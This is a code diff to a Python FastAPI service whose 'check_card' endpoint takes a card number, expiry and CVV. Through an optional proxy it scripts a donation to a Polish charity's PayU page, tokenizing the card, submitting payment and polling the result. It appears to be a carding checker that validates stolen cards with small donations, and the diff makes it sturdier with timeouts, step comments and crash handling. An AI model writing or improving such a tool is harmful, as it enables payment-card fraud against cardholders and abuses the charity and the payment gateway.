@@ -9,7 +9,7 @@ import requests
 
 app = FastAPI()
 
-# Allow semua domain akses API ni (sesuai untuk check di website)
+# Allow semua domain akses API ni
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -52,7 +52,7 @@ def _poll_status(session, order_id, token, ua, max_attempts=10, delay=3):
     data = {}
     for i in range(max_attempts):
         time.sleep(delay)
-        r = session.get(f'https://secure.payu.com/api/front/orders/{order_id}/status', headers=headers)
+        r = session.get(f'https://secure.payu.com/api/front/orders/{order_id}/status', headers=headers, timeout=30)
 
         try:
             data = r.json()
@@ -88,6 +88,7 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
         if len(yy) == 2:
             yy = '20' + yy
 
+        # ─── Step 1: Create donation order ───
         headers1 = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
@@ -113,7 +114,7 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
             'purpose': 'Pomoc Dariuszowi Glince',
         }
 
-        r1 = session.post('https://fundacjakukuczki.pl/payu-darowizna.php', headers=headers1, data=data1, allow_redirects=False)
+        r1 = session.post('https://fundacjakukuczki.pl/payu-darowizna.php', headers=headers1, data=data1, allow_redirects=False, timeout=30)
 
         order_id = None
         token = None
@@ -139,6 +140,7 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
         if not order_id or not token:
             return 'Failed to extract orderId or token'
 
+        # ─── Step 2: Load PayU pay page ───
         params2 = {
             'orderId': order_id,
             'token': token,
@@ -161,8 +163,9 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
             'user-agent': ua,
         }
 
-        session.get('https://secure.payu.com/pay/', params=params2, headers=headers2)
+        session.get('https://secure.payu.com/pay/', params=params2, headers=headers2, timeout=30)
 
+        # ─── Step 3: Tokenize card ───
         headers3 = {
             'accept': '*/*',
             'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
@@ -191,7 +194,7 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
             },
         }
 
-        r3 = session.post('https://secure.payu.com/api/front/tokens', headers=headers3, json=json3)
+        r3 = session.post('https://secure.payu.com/api/front/tokens', headers=headers3, json=json3, timeout=30)
 
         try:
             token_data = r3.json()
@@ -209,6 +212,7 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
                 return f'Tokenization failed: {error_msg}'
             return f'Failed to tokenize card'
 
+        # ─── Step 4: Submit payment ───
         masked = cc[:6] + '*' * 6 + cc[-4:]
 
         json4 = {
@@ -244,7 +248,7 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
             'invoice': None,
         }
 
-        r4 = session.post(f'https://secure.payu.com/api/front/orders/{order_id}/payments', headers=headers3, json=json4)
+        r4 = session.post(f'https://secure.payu.com/api/front/orders/{order_id}/payments', headers=headers3, json=json4, timeout=30)
 
         try:
             pay_data = r4.json()
@@ -260,6 +264,7 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
         if error_code:
             return f'Payment error: {error_code}'
 
+        # ─── Step 5: Poll for result ───
         if continue_url and 'threeds' in continue_url:
             final_status = _poll_status(session, order_id, token, ua, max_attempts=10, delay=3)
         else:
@@ -278,7 +283,7 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
             return f'{category}: {value}' if category else f'Unknown: {value}'
 
     except requests.exceptions.Timeout:
-        return 'Timeout'
+        return 'Timeout from Payment Gateway'
     except Exception as e:
         return f'Error: {str(e)}'
     finally:
@@ -295,5 +300,9 @@ def check_card(cc: str = Query(...)):
     if len(yy) == 2:
         yy = '20' + yy
         
-    result = _payu_sync(card_num, mm, yy, cvv_code)
+    try:
+        result = _payu_sync(card_num, mm, yy, cvv_code)
+    except Exception as e:
+        result = f"Process crashed: {str(e)}"
+        
     return {"message": result}
